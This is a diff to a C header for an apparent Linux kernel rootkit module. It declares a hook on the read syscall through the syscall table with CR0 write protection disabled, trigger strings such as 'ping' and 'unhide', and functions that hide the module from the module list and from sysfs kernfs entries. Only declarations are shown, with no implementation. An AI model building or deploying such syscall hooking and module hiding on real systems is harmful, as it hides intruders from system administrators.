@@ -28,17 +28,28 @@
 #define CR0_WRITE_PROTECT_MASK (1 << 16)
 #define HEARTBEAT "ping"
 #define HEARTBEAT_RESPONSE "pong"
-#define VOILA "showmod"
+#define VOILA "unhide"
 
 
-void **sys_call_table;
-asmlinkage long (*read_syscall)(unsigned int, char __user *, size_t);
+static int module_is_hidden;
+static struct list_head *module_prev;
+void **syscall_table;
+asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
 int heartbeat_matched_so_far;   /* Characters of HEARTBEAT matched so far */
 int voila_matched_so_far;   /* Characters of VOILA matched so far */
 
+
 void disable_write_protect_mode(void);
 void enable_write_protect_mode(void);
+
+asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count);
 int count_matches(char *, char *, int *);
 
-#endif
+void hide_module(void);
+void unhide_module(void);
 
+void remove_kernfs_node(struct kernfs_node *);
+int insert_kernfs_node(struct kernfs_node *);
+int name_compare(unsigned int hash, const char *, const void *, const struct kernfs_node *);
+
+#endif
